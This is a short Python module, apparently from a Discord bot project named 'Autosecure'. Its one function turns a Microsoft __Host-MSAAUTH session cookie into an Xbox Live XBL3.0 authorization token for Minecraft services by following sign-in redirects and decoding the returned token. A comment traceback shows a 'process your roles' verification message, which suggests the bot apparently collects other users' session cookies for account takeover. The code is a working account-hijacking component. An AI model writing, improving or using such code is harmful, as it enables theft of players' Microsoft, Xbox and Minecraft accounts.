import requests
import base64
import json
import re

# Spamming this endpoint gets you ratelimited for 1~2 minutes
# When XBL is not found it crashes
# Traceback (most recent call last):
#   File "C:\Users\salom\AppData\Local\Programs\Python\Python314\Lib\site-packages\discord\ui\modal.py", line 216, in _scheduled_task
#     await self.on_submit(interaction)
#   File "C:\Users\salom\Desktop\Autosecure\views\modals\modal_two.py", line 31, in on_submit
#     await interaction.response.send_message(
#         "⌛ Please Allow Up To One Minute For Us To Proccess Your Roles...", ephemeral=True
#     )
#   File "C:\Users\salom\AppData\Local\Programs\Python\Python314\Lib\site-packages\discord\interactions.py", line 1051, in send_message
#     response = await adapter.create_interaction_response(
#                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
#     ...<6 lines>...
#     )
#     ^
#   File "C:\Users\salom\AppData\Local\Programs\Python\Python314\Lib\site-packages\discord\webhook\async_.py", line 224, in request
#     raise NotFound(response, data)
# discord.errors.NotFound: 404 Not Found (error code: 10062): Unknown interaction

def getXBL(mssauth: str) -> dict:

    data = requests.get(
        url = "https://sisu.xboxlive.com/connect/XboxLive/?state=login&cobrandId=8058f65d-ce06-4c30-9559-473c9275a65d&tid=896928775&ru=https://www.minecraft.net/en-us/login&aid=1142970254",
        allow_redirects = False,
    )
    
    location = data.headers.get('Location')
    if not location:
        print("Location 1")
        print(data.headers)
        return None
    
    acessTokenRedirect = requests.get(
        url = location,
        headers = {
            "Cookie": f"__Host-MSAAUTH={mssauth}"
        },
        allow_redirects = False
    )

    location = acessTokenRedirect.headers.get('Location')
    if not location:
        print("Location 2")
        print(acessTokenRedirect.headers)
        return None
    
    accessTokenRedirect = requests.get(
        url = location,
        allow_redirects = False
    )

    # https://www.minecraft.net/en-us/login#state=login&accessToken=<token>
    location = accessTokenRedirect.headers.get('Location')
    if not location:
        print("Location 3")
        print(acessTokenRedirect.headers)
        return None
    
    token = re.search(r'accessToken=([^&#]+)', location)
    if not token:
        print("No token")
        return None
    
    accessToken = token.group(1) + "=" * ((4 - len(token.group(1)) % 4) % 4)

    decoded_data = base64.b64decode(accessToken).decode('utf-8')
    json_data = json.loads(decoded_data)

    uhs = json_data[0].get('Item2',{}).get('DisplayClaims',{}).get('xui',[{}])[0].get('uhs')

    xsts = ""
    for item in json_data:
        if item.get('Item1') == "rp://api.minecraftservices.com/":
            xsts = item.get('Item2', {}).get('Token', '')
            break
        
    return {"xbl": f"XBL3.0 x={uhs};{xsts}"}